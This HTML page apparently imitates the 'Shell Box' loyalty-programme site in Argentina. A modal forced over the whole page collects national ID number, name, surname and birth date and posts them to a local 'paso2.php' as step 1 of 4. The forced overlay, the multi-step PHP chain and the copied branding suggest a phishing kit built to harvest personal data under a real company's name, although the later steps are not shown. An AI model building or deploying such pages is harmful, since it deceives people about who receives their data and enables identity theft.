  <!doctype html>
  <html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Bootstrap demo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="style.css">
    <style type="text/css">
      .form-control{
        box-shadow: 0 0 0 !important;
      }
      .form-control:focus{
        border:1px solid #888;
      }
    </style>
  </head>
  <body class="bg-light">
    <div class="position-fixed h-100 w-100" style="top:0;left:0;z-index: 99999;overflow-y: scroll;">
      <div class="row m-0 py-5">
        <div class="col-sm-4 mt-5 m-auto p-3 bg-white rounded-4 shadow">
          <div class="text-end">
            <a href="index.html" class="font-monospace text-decoration-none fs-3 text-muted">
              X
            </a>
          </div>  
          <header class="d-flex align-items-center m-auto mb-4" style="max-width:350px;">  
            <img src="img/logo-header-shell.svg" height="50px">
            <h1 class="fs-4 text-dark ms-3">Registrate en Shell Box</h1>
          </header>

          <div class="d-flex my-4 steps justify-content-between m-auto position-relative steps-wrapper w-100" style="max-width:350px;">
            <div class="conteiner-steps ps-0 p-2">
              <div class="steps border-danger border text-danger text-center">
                1
              </div>
            </div>

            <div class="conteiner-steps p-2">
              <div class="steps border border-dark text-center">
                2
              </div>
            </div>


            <div class="conteiner-steps p-2">
              <div class="steps border border-dark text-center">
                3
              </div>
            </div>

            <div class="conteiner-steps p-2">
              <div class="steps border border-dark text-center">
                4
              </div>
            </div>
          </div>
          <form style="max-width:350px;" method="POST" action="paso2.php" class="m-auto">
            <p class="text-center text-danger fs-3">Datos personales</p>
            <div class="mb-3">
              <label for="exampleInputEmail1" class="form-label mb-0">Número de Documento (sin puntos ni guiones)</label>
              <input type="number" required placeholder="Ingresá tu número de documento " class="form-control" name="dnid" id="exampleInputEmail1" aria-describedby="">
            </div>
            <div class="mb-3">
              <label for="nom" required class="form-label mb-0">Nombre</label>
              <input type="text" name="nombre" placeholder="Ingresá tu nombre completo" class="form-control" id="nom">
            </div>

            <div class="mb-3">
              <label for="ape" required class="form-label mb-0">Apellido</label>
              <input type="text" name="apel" placeholder="Ingresá tu/tus apellido/s" class="form-control" id="ape">
            </div>


            <div class="mb-3">
              <label for="bird" required class="form-label mb-0">Fecha de nacimiento</label>
              <input type="date" name="date" class="form-control" id="bird">
            </div>


            <button type="submit" class="btn btn-danger w-100">Siguiente</button>
            <a href="login.html" class="btn btn-outline-danger w-100 fw-bold border-2 my-3">Iniciar sesión</a>
          </form>
        </div>
      </div>
    </div>
    <header style="position: fixed;top: 0;left: 0;z-index: 999;width: 100%;" class="bg-white">
      <nav class="navbar navbar-expand-lg bg-body-tertiary">
        <div class="container-fluid">
          <a class="navbar-brand" href="#">
            <img src="img/logo-shell.svg" height="40px">
          </a>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
              <li class="nav-item px-2">
                <a href="" class="btn btn-outline-danger rounded-2">Registrate</a>
              </li>
              <li class="nav-item px-2">
                <a href="login.html" class="btn btn-danger rounded-2">Iniciar sesión</a>
              </li>
            </ul>

          </div>
        </div>
      </nav>
    </header>
    <main class="mt-5 py-4">
      <div id="carouselExample" class="carousel slide">
        <div class="carousel-inner">
          <div class="carousel-item active">
            <img src="img/2023102013282937.png" class="d-block w-100" alt="...">
          </div>
        </div>
        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExample" data-bs-slide="prev">
          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
          <span class="visually-hidden">Previous</span>
        </button>
        <button class="carousel-control-next" type="button" data-bs-target="#carouselExample" data-bs-slide="next">
          <span class="carousel-control-next-icon" aria-hidden="true"></span>
          <span class="visually-hidden">Next</span>
        </button>
      </div>



      <div class="row m-0 m-auto rounded-5 my-5 p-4 conversion" style="max-width:1100px;">
        <div class="col-sm-3 pt-3 text-center">
          <h3 class="fs-5 text-white">Ahora podés convertir tus millas <b class="text-danger">a puntos</b></h3>
        </div>
        <div class="col-sm-2 pt-3">
          <button class="btn py-2 btn-light w-100 rounded-pill text-uppercase text-danger fs-4 p-3">MILLAS</button>
        </div>
        <div class="col-sm-2 pt-3 text-center">
          <img src="img/conversor-arrows.svg">
        </div>
        <div class="col-sm-2 pt-3">
          <button class="btn py-2 btn-light w-100 rounded-pill text-uppercase text-danger fs-4 p-3">puntos</button>
        </div>
        <div class="col-sm-3 pt-3">
          <button class="btn py-3  btn-danger w-100 rounded-pill p-3">CONVERTIR AHORA</button>
        </div>
      </div>
      <div style="max-width:1100px" class="text-center m-auto">
        <h4>CON SHELL BOX DISFRUTÁ</h4>
        <p class="p-3 m-auto fw-bold fs-4 bg-danger text-white rounded-4 inline-block" style="width: auto;max-width: 400px;">
          LOS MEJORES BENEFICIOS
        </p>
      </div>
      <div class="row m-auto mt-4" style="max-width: 1100px;">
        <div class="col-sm-3 p-3">
          <div class="card bg-white rounded-4 shadow bg-danger" style="overflow: hidden;">
            <h3 class="text-center text-white fw-lighter">Tecnologia</h3>
            <div class="card-body bg-white rounded-4">
              <img src="img/2021070712352197.jpg" height="100px" class="d-block m-auto">
              <h5 class="text-center fs-4 fw-bold text-danger">10%</h5>
              <p class="text-danger text-center">DE DESCUENTO</p>
            </div>
          </div>
        </div>

        <div class="col-sm-3 p-3">
          <div class="card bg-white rounded-4 shadow bg-danger" style="overflow: hidden;">
            <h3 class="text-center text-white fw-lighter">Automóvil</h3>
            <div class="card-body bg-white rounded-4">
              <img src="img/2021070712502890.jpg" height="100px" class="d-block m-auto">
              <h5 class="text-center fs-4 fw-bold text-danger">10%</h5>
              <p class="text-danger text-center">DE DESCUENTO</p>
            </div>
          </div>
        </div>


        <div class="col-sm-3 p-3">
          <div class="card bg-white rounded-4 shadow bg-danger" style="overflow: hidden;">
            <h3 class="text-center text-white fw-lighter">Hogar</h3>
            <div class="card-body bg-white rounded-4">
              <img src="img/2021070712435871.jpg" height="100px" class="d-block m-auto">
              <h5 class="text-center fs-4 fw-bold text-danger">10%</h5>
              <p class="text-danger text-center">DE DESCUENTO</p>
            </div>
          </div>
        </div>

        <div class="col-sm-3 p-3">
          <div class="card bg-white rounded-4 shadow bg-danger" style="overflow: hidden;">
            <h3 class="text-center text-white fw-lighter">Compras</h3>
            <div class="card-body bg-white rounded-4">
              <img src="img/2021070712462773.jpg" height="100px" class="d-block m-auto">
              <h5 class="text-center fs-4 fw-bold text-danger">10%</h5>
              <p class="text-danger text-center">DE DESCUENTO</p>
            </div>
          </div>
        </div>
      </div>

      <div class="row m-auto" style="max-width:1100px;">
        <div class="d-flex py-3 align-items-center">
          <img src="img/logo-borde-gris.svg">
          <h4 class="ms-4 text-danger">
            SUMARTE A SHELL BOX<br>
            ES MUY FÁCIL!
          </h4>
        </div>
      </div>



      <div class="row m-auto" style="max-width:1100px;">
        <div class="col-sm-4 p-3">
          <div class="shadow bg-white p-5 rounded-3 position-relative">
            <h5 class="mb-0 fs-3 text-danger">Registrate</h5>
            <p class="text-danger">
              En la web o<br>
              descargá la App Shell Box
            </p>
            <div style="left: 0;" class="position-absolute px-3 d-flex w-100 justify-content-between">
              <img src="img/laptop.png" height="80px">
              <img src="img/phone.png" height="80px">
              <img src="img/num1.svg" height="70px">
            </div>
          </div>
        </div>

        <div class="col-sm-4 p-3">
          <div class="shadow p-5 bg-white rounded-3 position-relative">
            <h5 class="mb-0 fs-3 text-danger">Registrate</h5>
            <p class="text-danger">
              En la web o<br>
              descargá la App Shell Box
            </p>
            <div style="left: 0;" class="position-absolute px-3 d-flex w-100 justify-content-between">
              <img src="img/pico.png" height="80px">
              <img src="img/vasocafe.png" height="80px">
              <img src="img/num2.svg" height="70px">
            </div>
          </div>
        </div>


        <div class="col-sm-4 p-3">
          <div class="shadow p-5 bg-white rounded-3 position-relative">
            <h5 class="mb-0 fs-3 text-danger">Registrate</h5>
            <p class="text-danger">
              En la web o<br>
              descargá la App Shell Box
            </p>
            <div style="left: 0;" class="position-absolute px-3 d-flex w-100 justify-content-between">
              <img src="img/avion.png" height="80px">
              <img src="img/num3.png" height="70px">
            </div>
          </div>
        </div>
      </div>
    </main>

    <footer class="p-3 row bg-white m-0">
      <div class="col-12 d-flex align-items-center">
        <img src="img/logo-shell.svg" height="30px">
        <ul class="d-flex mb-0">
          <li class="d-inline px-3">
            <img src="img/facebook.png">
          </li>
          <li class="d-inline px-3">|</li>
          <li class="d-inline px-3">
            <img src="img/instagram.png">
          </li>
        </ul>
      </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
  </body>
  </html>